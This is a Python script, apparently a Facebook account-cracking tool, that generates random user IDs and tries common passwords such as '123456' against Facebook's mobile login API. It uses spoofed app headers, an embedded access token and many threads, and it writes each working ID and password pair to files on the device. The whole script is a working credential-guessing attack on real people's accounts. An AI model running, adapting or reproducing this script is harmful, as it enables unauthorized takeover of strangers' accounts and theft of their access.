#!/usr/bin/python3

import os,time,random,json,sys
try:
    import requests
except:
    os.system("pip3 install requests")
    import requests 
from concurrent.futures import ThreadPoolExecutor as ThreadPool

logo = ("""\033[36m \033[1m
$$$$$$$$\ $$$$$$\ $$$$$$$\  $$$$$$$\  $$$$$$\ 
\____$$  |\_$$  _|$$  __$$\ $$  __$$\ \_$$  _|
    $$  /   $$ |  $$ |  $$ |$$ |  $$ |  $$ |  
   $$  /    $$ |  $$ |  $$ |$$ |  $$ |  $$ |  
  $$  /     $$ |  $$ |  $$ |$$ |  $$ |  $$ |  
 $$  /      $$ |  $$ |  $$ |$$ |  $$ |  $$ |  
$$$$$$$$\ $$$$$$\ $$$$$$$  |$$$$$$$  |$$$$$$\ 
\________|\______|\_______/ \_______/ \______|
\033[36m \033[1m
__________________×______________________
  Owner   :  ZIDDI SEHZADA\033[24m
  Github   : FUCK
  Facebook : MD BABU MIA
  Contact : +880161636**★★
__________________×______________________\033[32m""")


def ua():
  #  rr=random.randint
   # aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   #### rx=random.randrange(1, 999)
    xx="[FBAN/FB4A;FBAV/380.0.0.3.107;FBBV/572514146;FBDM/{density=3.2,width=1080,height=1435};FBLC/ru_RU;FBRV/686590741;FBCR/Jio 4G;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2101K7BG;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
    return xx


def main():
    user=[]
    os.system("clear")
    print (logo)
    limit=input(" input limit: ")
    os.system("clear")
    print (logo)
    print("—"*20)
    print("[1] 𝐌𝐀𝐃𝐄𝐑𝐒𝐔𝐃")
    print("[2] 𝐊𝐇𝐀𝐍𝐊𝐈𝐑𝐏𝐔𝐋𝐀")
    print("—"*20)
    ask=input("FUCK YOUR SYSTEM !>")
    os.system("clear")
    print (logo)
    print("—"*20)
    if ask in["1"]:
        star="50000"
        for i in range(int(limit)):
            data=str(random.choice(range(1000000000,9999999999)))
            user.append(data)
    else:
        star="100000"
        for i in range(int(limit)):
            data=str(random.choice(range(100000000,999999999)))
            user.append(data)
    
    with ThreadPool(max_workers=30) as heron:
        print(" LOCATION BD ")
        
        print("—"*20)
        for mal in user:
            uid=star+mal
            heron.submit(login,uid)
    
loop=0
oks=[]

def login(uid):
    global oks,loop
    Session=requests.session()
    try:
        sys.stdout.write(f"\r \x1b[38;5;196m[\033[38;5;46mZIDDI\x1b[1;97m-\033[38;5;46mSEHZADA\x1b[38;5;196m] \033[38;5;46m[{loop}-{len(oks)}]")
        sys.stdout.flush()
        for pw in ["123456","1234567","12345678","123456789","123123"]:
            headers = {
            "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
            "x-fb-sim-hni": str(random.randint(20000, 40000)), 
            "x-fb-net-hni": str(random.randint(20000, 40000)), 
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "user-agent": ua(), 
            "content-type": "application/x-www-form-urlencoded", 
            "x-fb-http-engine": "Liger"}
            rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
            if "session_key" in rp:
                print(f"\r\r [ZIDDI-SEHZADA] {uid} • {pw}")
                open("/sdcard/ZIDDI-SEHZADA-𝐅𝐔𝐂𝐊 𝐘𝐎𝐔𝐑 𝐆𝐅.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:
                print(f"\r\r [ZIDDI-SEHZADA] {uid} • {pw}")
                open("/sdcard/ZIDDI-SEHZADA-𝐃𝐀𝐓𝐀 𝐖𝐈𝐅𝐈 𝐖𝐎𝐑𝐊.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            elif "Please Confirm Email" in str(rp):
                print(f"\r\r [ZIDDI-SEHZADA] {uid} • {pw}")
                open("/sdcard/ZIDDI-SEHZADA-𝐅𝐔𝐂𝐊 𝐘𝐎𝐔𝐑 𝐆𝐅.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
    except:pass

import requests,os,sys
from concurrent.futures import ThreadPoolExecutor as ThreadPool

try:
    import requests
except:
    os.system("pip install requests")
    import requests 


with ThreadPool(max_workers=1000) as jjj:
    jjj.submit(main)








